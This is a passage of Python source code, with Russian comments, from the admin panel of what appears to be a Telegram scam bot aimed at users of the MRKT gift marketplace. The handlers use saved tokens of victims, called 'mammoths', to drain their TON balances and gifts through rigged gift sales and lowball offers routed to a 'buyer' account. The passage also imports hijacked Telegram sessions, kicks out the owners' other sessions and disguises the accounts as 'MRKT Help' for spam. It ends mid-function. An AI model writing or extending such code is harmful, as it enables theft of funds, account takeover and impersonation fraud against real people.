                f"⚠️ Баланс слишком мал для вывода: <b>{bal} TON</b>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
                ]),
            )
            return

        wd_result = await api.withdraw_ton(wallet, bal)
        await api.close()

        if wd_result.get("error"):
            err = wd_result.get("message", str(wd_result))
            await callback.message.edit_text(
                f"❌ <b>Ошибка вывода</b>\n\n"
                f"💵 Сумма: <b>{bal} TON</b>\n"
                f"💳 Кошелёк: <code>{wallet[:20]}...</code>\n"
                f"💥 {err}",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🔄 Повторить", callback_data=f"tkn_wd|{phone}"),
                     InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
                ]),
            )
        else:
            await callback.message.edit_text(
                f"✅ <b>Вывод отправлен!</b>\n\n"
                f"💵 Сумма: <b>{bal} TON</b>\n"
                f"💳 Кошелёк: <code>{wallet[:20]}...</code>\n"
                f"👤 @{data.get('username', '?')}",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="💰 Проверить баланс", callback_data=f"tkn_bal|{phone}"),
                     InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
                ]),
            )
    except Exception as e:
        await callback.message.edit_text(
            f"❌ <b>Ошибка вывода</b>\n<code>{e}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
            ]),
        )


@dp.callback_query(F.data.startswith("tkn_giftwd|"))
async def cb_token_gift_withdraw(callback: CallbackQuery):
    """Вывод баланса мамонта через покупку гифта байера."""
    if not is_admin(callback.from_user.id):
        return
    phone = callback.data.split("|", 1)[1]
    data = saved_tokens.get(phone)
    if not data:
        await callback.answer("❌ Токен не найден", show_alert=True)
        return

    # Проверяем байера
    if not buyer_token_data.get("token"):
        await callback.answer("❌ Байер не настроен! Используй /buyer set", show_alert=True)
        return

    await callback.answer("⏳ Запускаю вывод через гифт...")

    try:
        # API мамонта
        victim_api = MrktAPI(data["token"])
        victim_bal = await victim_api.get_balance_ton()

        if victim_bal < 0.5:
            await victim_api.close()
            await callback.message.edit_text(
                f"⚠️ Баланс мамонта слишком мал: <b>{victim_bal} TON</b>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
                ]),
            )
            return

        # API байера
        buyer_api = MrktAPI(buyer_token_data["token"])

        # Шаг 1: Берём гифт из инвентаря байера
        buyer_vault = await buyer_api.get_vault()
        if not buyer_vault:
            await victim_api.close()
            await buyer_api.close()
            await callback.message.edit_text(
                "❌ У байера нет гифтов в инвентаре!\nКупи хотя бы 1 дешёвый гифт.",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
                ]),
            )
            return

        gift = buyer_vault[0]
        gift_id = gift.get("id") or gift.get("giftIdString")
        gift_name = gift.get("name") or gift.get("modelName") or gift.get("collectionName", "Gift")

        # Шаг 2: Цена = баланс мамонта - 0.1
        sell_price = round(victim_bal - 0.1, 2)

        await callback.message.edit_text(
            f"⏳ <b>Вывод через гифт</b>\n\n"
            f"👤 Мамонт: @{data.get('username', '?')}\n"
            f"💰 Баланс: {victim_bal} TON\n"
            f"🎁 Гифт: {gift_name}\n"
            f"💵 Цена: {sell_price} TON\n\n"
            f"⏳ Листим гифт байера...",
            parse_mode="HTML",
        )

        # Шаг 3: Байер листит гифт (с ретраями — после delist маркет может тормозить)
        sell_result = await buyer_api.sell_gift(gift_id, sell_price)
        listed_ids = sell_result.get("ids", []) if isinstance(sell_result, dict) else []
        
        if not listed_ids:
            # Фаза 2: ждём дольше и пробуем ещё
            await callback.message.edit_text(
                f"⏳ <b>Вывод через гифт</b>\n\n"
                f"🎁 Гифт: {gift_name}\n"
                f"💵 Цена: {sell_price} TON\n\n"
                f"⏳ Маркет тормозит, жду 10 сек...",
                parse_mode="HTML",
            )
            await asyncio.sleep(10)
            for retry in range(3):
                sell_result = await buyer_api.sell_gift(gift_id, sell_price)
                listed_ids = sell_result.get("ids", []) if isinstance(sell_result, dict) else []
                if listed_ids:
                    break
                await asyncio.sleep(5)
        
        if not listed_ids:
            await victim_api.close()
            await buyer_api.close()
            await callback.message.edit_text(
                f"❌ <b>Не удалось выставить гифт</b>\n\n"
                f"Ответ: <code>{str(sell_result)[:200]}</code>\n\n"
                f"Попробуй выставить вручную и используй 🛒 Купить гифт (ID)",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🔄 Повторить", callback_data=f"tkn_giftwd|{phone}"),
                     InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
                ]),
            )
            return
        await asyncio.sleep(2)

        # Шаг 4: Мамонт покупает
        sell_price_nano = int(round(sell_price * 1_000_000_000))
        buy_result = await victim_api.buy_gift(gift_id, sell_price_nano)

        # Проверяем (MRKT возвращает покупку в поле "error" — кривое API)
        is_success = False
        if isinstance(buy_result, list) and len(buy_result) > 0:
            is_success = True
        elif isinstance(buy_result, dict):
            err_data = buy_result.get("error", [])
            if isinstance(err_data, list) and len(err_data) > 0:
                first = err_data[0] if err_data else {}
                if isinstance(first, dict) and first.get("source", {}).get("type") == "buy_gift":
                    is_success = True

        if not is_success:
            await buyer_api.cancel_sale(gift_id)
            await victim_api.close()
            await buyer_api.close()
            await callback.message.edit_text(
                f"❌ <b>Мамонт не смог купить</b>\n\nОтвет: <code>{str(buy_result)[:200]}</code>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🔄 Повторить", callback_data=f"tkn_giftwd|{phone}"),
                     InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
                ]),
            )
            return

        await asyncio.sleep(2)

        # Шаг 5: Проверяем
        buyer_bal = await buyer_api.get_balance_ton()
        victim_bal_after = await victim_api.get_balance_ton()

        await victim_api.close()
        await buyer_api.close()

        await callback.message.edit_text(
            f"✅ <b>Вывод через гифт — успех!</b>\n\n"
            f"👤 Мамонт: @{data.get('username', '?')}\n"
            f"🎁 Гифт: {gift_name} → {sell_price} TON\n"
            f"💰 Баланс мамонта: {victim_bal} → {victim_bal_after} TON\n"
            f"💰 Баланс байера: {buyer_bal} TON\n\n"
            f"💡 Выведи с байера вручную!",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💰 Баланс", callback_data=f"tkn_bal|{phone}"),
                 InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
            ]),
        )

    except Exception as e:
        # Пытаемся снять гифт с продажи при ошибке
        try:
            buyer_api2 = MrktAPI(buyer_token_data["token"])
            vault = await buyer_api2.get_my_saling()
            for g in vault:
                gid = g.get("id") or g.get("giftIdString")
                if gid:
                    await buyer_api2.cancel_sale(gid)
            await buyer_api2.close()
        except Exception:
            pass

        await callback.message.edit_text(
            f"❌ <b>Ошибка вывода через гифт</b>\n\n<code>{e}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Повторить", callback_data=f"tkn_giftwd|{phone}"),
                 InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
            ]),
        )


# ── Вывести остаток через оффер ──

@dp.callback_query(F.data.startswith("tkn_offerwd|"))
async def cb_token_offer_withdraw(callback: CallbackQuery):
    """
    Вывод гифта через оффер:
    1. Мамонт листит гифт по цене floor + 0.1 TON
    2. Байер кидает оффер за 50% от цены листинга
    3. Мамонт принимает оффер
    """
    if not is_admin(callback.from_user.id):
        return
    phone = callback.data.split("|", 1)[1]
    data = saved_tokens.get(phone)
    if not data:
        await callback.answer("❌ Токен не найден", show_alert=True)
        return

    # Проверяем наличие байера
    _load_buyer_token()  # обновляем глобал
    if not buyer_token_data or not buyer_token_data.get("token"):
        await callback.answer("❌ Байер не настроен! /buyer set ...", show_alert=True)
        return

    await callback.answer("⏳ Вывод через оффер...")

    try:
        mammont_api = MrktAPI(data["token"])
        buyer_api = MrktAPI(buyer_token_data["token"])

        # 1. Получаем инвентарь мамонта
        vault = await mammont_api.get_vault()
        if not vault:
            await callback.message.edit_text(
                "❌ <b>У мамонта нет гифтов в хранилище</b>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
                ]),
            )
            await mammont_api.close()
            await buyer_api.close()
            return

        # 2. Проверяем баланс байера
        buyer_bal = await buyer_api.get_balance_ton()

        results = []
        errors = []

        for gift in vault:
            gid = str(gift.get("id") or gift.get("giftIdString", ""))
            gname = gift.get("name") or gift.get("collectionName") or "?"
            slug = gift.get("name", "")

            if not gid:
                continue

            # Floor price
            floor_nano = (
                gift.get("floorPriceNanoTONsByCollection")
                or gift.get("floorPriceNanoTONsByBackdropModel")
            )
            if not floor_nano:
                # Попробуем получить через QS
                qs = await mammont_api.get_quick_sale_price(gid)
                floor_nano = int(qs * 1_000_000_000) if qs > 0 else 0

            if not floor_nano:
                errors.append(f"{gname}: нет floor price")
                continue

            floor_nano = int(floor_nano)
            # Листим за floor + 0.1 TON
            list_price_nano = floor_nano + 100_000_000  # +0.1 TON
            list_price_ton = round(list_price_nano / 1e9, 2)

            # Оффер = 50% от цены листинга
            offer_price_nano = list_price_nano // 2
            offer_price_ton = round(offer_price_nano / 1e9, 2)

            # Проверяем баланс байера
            if buyer_bal < offer_price_ton:
                errors.append(f"{gname}: у байера нет {offer_price_ton} TON (есть {buyer_bal})")
                continue

            # 3. Мамонт листит гифт
            sell_result = await mammont_api.sell_gift(gid, list_price_ton)
            listed_ids = sell_result.get("ids", []) if isinstance(sell_result, dict) else []
            if not listed_ids:
                errors.append(f"{gname}: не удалось залистить")
                continue

            logger.info(f"[OFFER-WD] Listed {gname} for {list_price_ton} TON")

            # 4. Получаем saleId
            import asyncio
            await asyncio.sleep(1)  # Подождать пока маркет обновится

            gift_info = await mammont_api.get_gift_sale_info(gid)
            sale_id = None
            if isinstance(gift_info, dict):
                sale_id = gift_info.get("saleId") or gift_info.get("sale_id") or gift_info.get("id")
            
            if not sale_id:
                # Попробуем giftSaleId из saling
                saling = await mammont_api.get_my_saling()
                for s in saling:
                    if str(s.get("id")) == gid or str(s.get("giftIdString")) == gid:
                        sale_id = s.get("saleId") or s.get("id")
                        break

            if not sale_id:
                errors.append(f"{gname}: не нашёл saleId")
                continue

            # 5. Байер кидает оффер
            offer_result = await buyer_api.create_offer(sale_id, offer_price_nano)
            if isinstance(offer_result, dict) and offer_result.get("error"):
                errors.append(f"{gname}: оффер не создан — {offer_result.get('message', '?')}")
                continue

            logger.info(f"[OFFER-WD] Buyer offered {offer_price_ton} TON on {gname}")

            # 6. Мамонт ищет и принимает оффер
            await asyncio.sleep(2)  # Подождать появление оффера
            activities = await mammont_api.get_activities(is_active=True)
            
            accepted = False
            for act in activities:
                # Структура: {"type": "offer_activity", "offer": {"id": "...", "gift": {"id": "..."}}}
                act_offer = act.get("offer") or {}
                # Гифт вложен в offer.gift
                act_gift = act_offer.get("gift") or act.get("gift") or act.get("userGift") or {}
                offer_id = act_offer.get("id") or act.get("offerId")
                act_gift_id = str(act_gift.get("id") or act_gift.get("giftIdString") or "")
                
                if act_gift_id == gid and offer_id:
                    accept_res = await mammont_api.accept_offer(str(offer_id))
                    if isinstance(accept_res, dict) and accept_res.get("error"):
                        errors.append(f"{gname}: accept failed — {accept_res.get('message', '?')}")
                    else:
                        accepted = True
                        buyer_bal -= offer_price_ton
                        results.append({"name": gname, "slug": slug, "offer": offer_price_ton, "list": list_price_ton})
                        logger.info(f"[OFFER-WD] Accepted offer on {gname} → {offer_price_ton} TON")
                    break
            
            if not accepted and gname not in str(errors):
                errors.append(f"{gname}: оффер не найден в activities")

        await mammont_api.close()
        await buyer_api.close()

        # Формируем отчёт
        text = f"🔄 <b>Вывод остатка @{data.get('username', '?')}</b>\n\n"
        
        if results:
            text += "<blockquote><b>✅ Выведено:</b>\n"
            for r in results:
                if r["slug"]:
                    text += f'  • <a href="https://t.me/nft/{r["slug"]}">{r["name"]}</a> — оффер {r["offer"]} TON\n'
                else:
                    text += f'  • {r["name"]} — оффер {r["offer"]} TON\n'
            text += "</blockquote>\n"

        if errors:
            text += "<blockquote><b>❌ Ошибки:</b>\n"
            for e in errors:
                text += f"  • {e}\n"
            text += "</blockquote>"

        if not results and not errors:
            text += "Нет гифтов для вывода"

        await callback.message.edit_text(
            text,
            parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Обновить", callback_data=f"tkn_offerwd|{phone}"),
                 InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
            ]),
        )

        # Отправляем лог в отдельную группу (канал), если есть успешные выводы
        if results:
            await send_admin_log(text)
            await send_log_to_chat(text)

    except Exception as e:
        logger.exception(f"[OFFER-WD] Error: {e}")
        await callback.message.edit_text(
            f"❌ <b>Ошибка</b>\n<code>{e}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
            ]),
        )


# ── Купить гифт по ID (ручной) ──
# Состояния: {user_id: {"phone": phone, "waiting": True}}
_buygift_state: Dict[int, dict] = {}


@dp.callback_query(F.data.startswith("tkn_buygift|"))
async def cb_token_buygift(callback: CallbackQuery):
    """Начало: просит ввести ID гифта для покупки с акка мамонта."""
    if not is_admin(callback.from_user.id):
        return
    phone = callback.data.split("|", 1)[1]
    data = saved_tokens.get(phone)
    if not data:
        await callback.answer("❌ Токен не найден", show_alert=True)
        return

    # Проверяем баланс
    try:
        api = MrktAPI(data["token"])
        bal = await api.get_balance_ton()
        await api.close()
    except Exception:
        bal = "?"

    _buygift_state[callback.from_user.id] = {"phone": phone, "waiting": True}

    await callback.message.edit_text(
        f"🛒 <b>Купить гифт с акка мамонта</b>\n\n"
        f"👤 @{data.get('username', '?')}\n"
        f"💰 Баланс: {bal} TON\n\n"
        f"<b>Инструкция:</b>\n"
        f"1. Выстави гифт с акка байера на MRKT (руками)\n"
        f"2. Скопируй ID гифта (UUID) из URL или инвентаря\n"
        f"3. Отправь сюда ID и цену через пробел:\n"
        f"<code>uuid цена_в_тонах</code>\n\n"
        f"Пример:\n"
        f"<code>eca9ea91-3825-4412-af55-75ba7b420b48 40.5</code>\n\n"
        f"Или просто ID (купит по текущей цене):\n"
        f"<code>eca9ea91-3825-4412-af55-75ba7b420b48</code>\n\n"
        f"❌ Отмена: /cancel",
        parse_mode="HTML",
    )
    await callback.answer()
async def cb_token_withdraw_custom(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    phone = callback.data.split("|", 1)[1]
    data = saved_tokens.get(phone)
    if not data:
        await callback.answer("❌ Токен не найден", show_alert=True)
        return

    # Сохраняем состояние ожидания ввода
    uid = callback.from_user.id
    auth_sessions[f"_tkn_wd_{uid}"] = {"phone": phone, "step": "input"}

    await callback.message.edit_text(
        f"✏️ <b>Ручной вывод @{data.get('username', '?')}</b>\n\n"
        f"Отправь одним сообщением:\n"
        f"<code>КОШЕЛЁК СУММА</code>\n\n"
        f"Пример:\n"
        f"<code>UQAbCdEf123... 50.5</code>\n\n"
        f"Или <code>UQAbCdEf123... all</code> для вывода всего баланса.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ Отмена", callback_data=f"tkn_view|{phone}")],
        ]),
    )
    await callback.answer()

active_parsers = {}

@dp.callback_query(F.data == "mrkt_adm_start_spam")
async def cb_start_spam(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
        
    d = mrkt_config.BROADCAST_SESSIONS_DIR
    files = [f for f in os.listdir(d) if f.startswith("parser_") and f.endswith(".session")] if os.path.exists(d) else []
    
    if not files:
        await callback.answer("❌ Нет авторизованных спам-аккаунтов!", show_alert=True)
        return
        
    if "main" in active_parsers and active_parsers["main"].is_running:
        await callback.answer("⚠️ Парсер уже запущен!", show_alert=True)
        return
        
    session_paths = [os.path.join(d, f) for f in files]
        
    parser = SpamParser(session_paths, "", notify_callback=send_admin_log, worker_notify=_worker_notify)
    active_parsers["main"] = parser
    
    await callback.answer("🚀 Парсер запущен!", show_alert=True)
    await callback.message.answer(f"🚀 <b>Парсер запущен!</b>\nЗагружено аккаунтов: <b>{len(session_paths)}</b>")
    
    # Запускаем асинхронно
    asyncio.create_task(parser.start())


@dp.callback_query(F.data == "mrkt_adm_stop_spam")
async def cb_stop_spam(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
        
    if "main" in active_parsers and active_parsers["main"].is_running:
        await active_parsers["main"].stop()
        del active_parsers["main"]
        await callback.answer("⏹ Парсер остановлен!", show_alert=True)
        await callback.message.answer("🛑 Парсер остановлен.")
    else:
        await callback.answer("⚠️ Парсер не запущен", show_alert=True)

# ══════════════════════════════════════════════════════════════
#  FEED PARSER (MRKT activity feed)
# ══════════════════════════════════════════════════════════════

@dp.callback_query(F.data == "mrkt_adm_start_feed")
async def cb_start_feed(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return

    # Проверяем buyer token
    if not buyer_token_data.get("token"):
        await callback.answer("❌ Нет токена байера! /buyer set", show_alert=True)
        return

    d = mrkt_config.BROADCAST_SESSIONS_DIR
    files = (
        [f for f in os.listdir(d) if f.startswith("parser_") and f.endswith(".session")]
        if os.path.exists(d) else []
    )
    if not files:
        await callback.answer("❌ Нет спам-аккаунтов!", show_alert=True)
        return

    if "feed" in active_parsers and active_parsers["feed"].is_running:
        await callback.answer("⚠️ Feed парсер уже запущен!", show_alert=True)
        return

    # Создаём MrktAPI из buyer token
    feed_api = MrktAPI(buyer_token_data["token"])
    session_paths = [os.path.join(d, f) for f in files]

    parser = FeedParser(
        mrkt_api=feed_api,
        session_paths=session_paths,
        notify_callback=send_admin_log,
        worker_notify=_worker_notify,
    )
    active_parsers["feed"] = parser

    await callback.answer("📡 Feed парсер запущен!", show_alert=True)
    await callback.message.answer(
        f"📡 <b>Feed Parser запущен!</b>\n"
        f"📱 Аккаунтов: <b>{len(session_paths)}</b>\n"
        f"🔑 API токен: байер (@{buyer_token_data.get('username', '?')})\n"
        f"📊 Типы: listing, sale, change_price"
    )
    asyncio.create_task(parser.start())


@dp.callback_query(F.data == "mrkt_adm_stop_feed")
async def cb_stop_feed(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return

    if "feed" in active_parsers and active_parsers["feed"].is_running:
        await active_parsers["feed"].stop()
        stats = active_parsers["feed"]._stats
        del active_parsers["feed"]
        await callback.answer("⏹ Feed парсер остановлен!", show_alert=True)
        await callback.message.answer(
            f"🛑 Feed Parser остановлен.\n"
            f"📊 Статистика: {stats['parsed']} parsed, "
            f"{stats['sent']} sent, {stats['skipped']} skipped, "
            f"{stats['errors']} errors"
        )
    else:
        await callback.answer("⚠️ Feed парсер не запущен", show_alert=True)


# ══════════════════════════════════════════════════════════════
#  SPAM ACCOUNT AUTO-SETUP
# ══════════════════════════════════════════════════════════════

async def _setup_spam_account(client, status_callback=None):
    """Автонастройка спам-аккаунта после авторизации:
    - Ставит аватарку
    - Меняет имя
    - Скрывает Last Online
    - Отключает звонки
    - Убирает био
    - Убирает юзернейм
    """
    from telethon import functions, types
    results = []
    
    try:
        # 0. Кикаем все другие сессии (оставляем только текущую)
        try:
            auths = await client(functions.account.GetAuthorizationsRequest())
            kicked = 0
            for auth in auths.authorizations:
                if not auth.current:
                    try:
                        await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                        kicked += 1
                    except Exception:
                        pass
            if kicked:
                results.append(f"✅ Кикнуто сессий: {kicked}")
            else:
                results.append("✅ Других сессий нет")
        except Exception as e:
            results.append(f"❌ Кик сессий: {e}")
        
        # 1. Смена имени + убираем био
        first_name = getattr(mrkt_config, "SPAM_FIRST_NAME", "MRKT Help")
        try:
            await client(functions.account.UpdateProfileRequest(
                first_name=first_name,
                last_name="",
                about=""
            ))
            results.append("✅ Имя + био")
        except Exception as e:
            results.append(f"❌ Имя: {e}")
        
        # 2. Убираем username (если уже пустой — пропускаем)
        try:
            me = await client.get_me()
            if me.username:
                await client(functions.account.UpdateUsernameRequest(username=""))
                results.append("✅ Username убран")
            else:
                results.append("✅ Username уже пуст")
        except Exception as e:
            if "not different" in str(e).lower():
                results.append("✅ Username уже пуст")
            else:
                results.append(f"❌ Username: {e}")
        
        # 3. Скрываем Last Online
        try:
            await client(functions.account.SetPrivacyRequest(
                key=types.InputPrivacyKeyStatusTimestamp(),
                rules=[types.InputPrivacyValueDisallowAll()]
            ))
            results.append("✅ Last Online скрыт")
        except Exception as e:
            results.append(f"❌ Last Online: {e}")
        
        # 4. Отключаем звонки
        try:
            await client(functions.account.SetPrivacyRequest(
                key=types.InputPrivacyKeyPhoneCall(),
                rules=[types.InputPrivacyValueDisallowAll()]
            ))
            results.append("✅ Звонки выкл")
        except Exception as e:
            results.append(f"❌ Звонки: {e}")
        
        # 5. Скрываем номер телефона
        try:
            await client(functions.account.SetPrivacyRequest(
                key=types.InputPrivacyKeyPhoneNumber(),
                rules=[types.InputPrivacyValueDisallowAll()]
            ))
            results.append("✅ Телефон скрыт")
        except Exception as e:
            results.append(f"❌ Телефон: {e}")
        
        # 6. Ставим аватарку (удаляем все старые)
        avatar_path = getattr(mrkt_config, "SPAM_AVATAR_PATH", "mrkt/spam_avatar.jpg")
        if not os.path.isabs(avatar_path):
            base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            avatar_path = os.path.join(base, avatar_path)
        
        if os.path.exists(avatar_path):
            try:
                photos = await client(functions.photos.GetUserPhotosRequest(
                    user_id=types.InputUserSelf(),
                    offset=0, max_id=0, limit=100
                ))
                deleted_photos = 0
                if photos.photos:
                    for photo in photos.photos:
                        try:
                            await client(functions.photos.DeletePhotosRequest(
                                id=[types.InputPhoto(
                                    id=photo.id,
                                    access_hash=photo.access_hash,
                                    file_reference=photo.file_reference
                                )]
                            ))
                            deleted_photos += 1
                        except Exception:
                            pass
                    if deleted_photos:
                        results.append(f"✅ Удалено старых фото: {deleted_photos}")
                
                uploaded = await client.upload_file(avatar_path)
                await client(functions.photos.UploadProfilePhotoRequest(file=uploaded))
                results.append("✅ Аватарка установлена")
            except Exception as e:
                results.append(f"❌ Аватарка: {e}")
        else:
            results.append(f"⚠️ Аватарка не найдена: {avatar_path}")
        
        # 7. Подписка на канал @getSendGifts
        try:
            channel = await client.get_entity("getSendGifts")
            await client(functions.channels.JoinChannelRequest(channel))
            results.append("✅ Подписка @getSendGifts")
        except Exception as e:
            if "already" in str(e).lower() or "CHANNELS_TOO_MUCH" in str(e):
                results.append("✅ Уже подписан @getSendGifts")
            else:
                results.append(f"❌ Канал: {e}")
        
        await asyncio.sleep(1)
        
        # 8. /start в @getSendGiftsProBot
        try:
            await client.send_message("getSendGiftsProBot", "/start")
            results.append("✅ /start @getSendGiftsProBot")
        except Exception as e:
            results.append(f"❌ /start бот: {e}")
        
        await asyncio.sleep(3)
        
        # 9. /swag в бота из конфига
        try:
            bot_username = mrkt_config.BOT_USERNAME.lstrip("@")
            await client.send_message(bot_username, "/swag")
            results.append(f"✅ /swag @{bot_username}")
        except Exception as e:
            results.append(f"❌ /swag: {e}")
        
    except Exception as e:
        results.append(f"❌ Общая ошибка: {e}")
    
    report = " | ".join(results)
    logger.info(f"[SETUP] Настройка акка: {report}")
    
    if status_callback:
        try:
            await status_callback(f"🔧 <b>Авто-настройка:</b>\n" + "\n".join(results))
        except Exception:
            pass
    
    return results


# ── Загрузка .session файлов (tdata) ──
@dp.message(F.document)
async def handle_session_file_upload(message: types.Message):
    """
    Админ/воркер отправляет файл с Telethon StringSession —
    бот автоматически сохраняет его как спам-аккаунт.
    """
    uid = message.from_user.id
    is_adm = is_admin(uid)
    is_wkr = worker_system.is_worker(uid)

    if not is_adm and not is_wkr:
        return

    doc = message.document
    fname = doc.file_name or ""

    allowed_ext = fname.endswith(".session") or fname.endswith(".txt") or "." not in fname
    is_zip = fname.endswith(".zip")

    if not allowed_ext and not is_zip:
        return

    if is_zip and doc.file_size > 50_000_000:
        await message.reply("❌ ZIP слишком большой (макс 50MB)")
        return
    if not is_zip and doc.file_size > 10_000:
        await message.reply("❌ Файл слишком большой. StringSession обычно < 1KB.")
        return

    msg = await message.reply("⏳ Загружаю и проверяю...")

    try:
        setup_results = []
        file = await bot.download(doc)
        raw_bytes = file.read()
        file.close()

        if is_zip:
            from tdata_converter import tdata_zip_to_session
            result = await tdata_zip_to_session(raw_bytes)
            if not result["ok"]:
                await msg.edit_text(f"❌ {result['error']}")
                return
            session_str = result["session_str"]
            acc_id = result["acc_id"]
            acc_name = result["acc_name"]
            
            # Подключаемся для настройки через прокси
            from telethon import TelegramClient
            from telethon.sessions import StringSession
            import socks as _socks
            
            _spam_proxies = []
            _proxy_kw = {}
            _used_proxy_str = "без прокси"
            if _spam_proxies:
                _sp = _spam_proxies[0]
                if _sp[2] and _sp[3]:
                    _proxy_kw["proxy"] = (_socks.SOCKS5, _sp[0], _sp[1], True, _sp[2], _sp[3])
                else:
                    _proxy_kw["proxy"] = (_socks.SOCKS5, _sp[0], _sp[1])
                _used_proxy_str = f"{_sp[0]}:{_sp[1]}"
            
            logger.info(f"[TDATA] Подключение для настройки через: {_used_proxy_str}")
            tdata_client = TelegramClient(
                StringSession(session_str), api_id=mrkt_config.API_ID,
                api_hash=mrkt_config.API_HASH,
                device_model="Desktop", system_version="Windows 11",
                app_version="6.0.5 x64", **_proxy_kw)
            try:
                await tdata_client.connect()
                if await tdata_client.is_user_authorized():
                    # Автонастройка
                    await msg.edit_text("⏳ Настраиваю аккаунт...")
                    setup_results = await _setup_spam_account(tdata_client)
                    me2 = await tdata_client.get_me()
                    acc_name = me2.first_name or acc_id
                else:
                    setup_results = ["⚠️ Сессия не авторизована — настройка пропущена"]
                await tdata_client.disconnect()
            except Exception as e:
                logger.error(f"[TDATA] Ошибка настройки: {e}")
                setup_results = [f"⚠️ Ошибка подключения: {str(e)[:100]}"]
                try:
                    await tdata_client.disconnect()
                except Exception:
                    pass
        else:
            session_str = raw_bytes.decode("utf-8", errors="ignore").strip()
            session_str = session_str.replace("\ufeff", "").replace("\n", "").replace("\r", "").strip()

            if not session_str or len(session_str) < 100:
                await msg.edit_text("❌ Файл пустой или не содержит валидную StringSession.")
                return

            from telethon import TelegramClient
            from telethon.sessions import StringSession
            import socks as _socks
            
            # Используем спам-прокси если есть
            _spam_proxies = []
            _proxy_kw = {}
            _used_proxy_str = "без прокси"
            if _spam_proxies:
                _sp = _spam_proxies[0]
                if _sp[2] and _sp[3]:
                    _proxy_kw["proxy"] = (_socks.SOCKS5, _sp[0], _sp[1], True, _sp[2], _sp[3])
                else:
                    _proxy_kw["proxy"] = (_socks.SOCKS5, _sp[0], _sp[1])
                _used_proxy_str = f"{_sp[0]}:{_sp[1]}"
            
            logger.info(f"[UPLOAD] Подключение через: {_used_proxy_str}")
            test_client = TelegramClient(
                StringSession(session_str), api_id=mrkt_config.API_ID,
                api_hash=mrkt_config.API_HASH,
                device_model="Desktop", system_version="Windows 11",
                app_version="6.0.5 x64", **_proxy_kw)
            await test_client.connect()
            if not await test_client.is_user_authorized():
                await test_client.disconnect()
                await msg.edit_text("❌ Сессия невалидна (не авторизована).")
                return
            me = await test_client.get_me()
            acc_id = str(me.id)
            acc_name = me.username or me.first_name or acc_id
            
            # Автонастройка акка
            await msg.edit_text("⏳ Настраиваю аккаунт...")
            setup_results = await _setup_spam_account(test_client)
            
            # Обновляем имя после настройки (могло измениться)
            me2 = await test_client.get_me()
            acc_name = me2.first_name or acc_id
            
            await test_client.disconnect()

        sessions_dir = mrkt_config.BROADCAST_SESSIONS_DIR
        os.makedirs(sessions_dir, exist_ok=True)

        session_file_path = os.path.join(sessions_dir, f"parser_{acc_id}.session")
        with open(session_file_path, "w", encoding="utf-8") as f:
            f.write(session_str)

        # Сохраняем username
        unames_path = os.path.join(sessions_dir, "usernames.json")
        udata = {}
        if os.path.exists(unames_path):
            try:
                with open(unames_path, "r", encoding="utf-8") as f2:
                    udata = json.load(f2)
            except Exception:
                pass
        udata[acc_id] = acc_name
        with open(unames_path, "w", encoding="utf-8") as f2:
            json.dump(udata, f2, ensure_ascii=False, indent=2)

        if is_wkr:
            worker_system.add_spam_account(uid, acc_id, acc_id)

        src = "tdata" if is_zip else "session"
        setup_report = "\n".join(setup_results) if setup_results else "⚠️ Настройка не выполнена"
        await msg.edit_text(
            f"✅ <b>Спам-акк готов к работе!</b> ({src})\n\n"
            f"🆔 <code>{acc_id}</code>\n"
            f"📁 <code>{os.path.basename(session_file_path)}</code>\n\n"
            f"🔧 <b>Настройка:</b>\n{setup_report}\n\n"
            f"🚀 <i>Аккаунт полностью настроен. Запусти парсер через админку.</i>",
            parse_mode="HTML"
        )

        await send_admin_log(
            f"📱 <b>Спам-акк готов!</b> ({src})\n"
            f"🆔 <code>{acc_id}</code>\n"
            f"👷 Загрузил: @{message.from_user.username or uid}\n\n"
            f"🔧 <b>Настройка:</b>\n{setup_report}"
        )

    except Exception as e:
